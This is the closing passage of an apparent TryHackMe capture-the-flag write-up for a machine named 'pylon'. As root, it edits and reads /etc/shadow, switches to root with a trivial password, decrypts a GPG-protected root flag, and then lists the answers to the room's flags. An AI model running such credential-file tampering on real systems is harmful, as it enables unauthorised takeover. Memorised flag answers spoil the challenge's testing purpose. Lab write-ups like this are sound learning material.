bash-4.4# nano /etc/shadow

bash-4.4# head /etc/shadow
root:$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0:18480:0:99999:7:::

bash-4.4# su root
Password: password
root@pylon:~# ls
root.txt.gpg
root@pylon:~# gpg -d root.txt.gpg
gpg: Note: secret key 91B77766BE20A385 expired at Fri Jan 27 19:04:03 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
ThM{OpenVPN_script_pwn}


```

What is Flag 1?

The encryption key is encoded, did you find the scheme? This user really loves his dog, try his dog's name.

*THM{homebrew_password_manager}*

What is User1 flag?

*TMM{easy_does_it}*

What is User2 flag?

*THM{homebrew_encryption_lol}*

What is root's flag?

*ThM{OpenVPN_script_pwn}*


[[toc2]]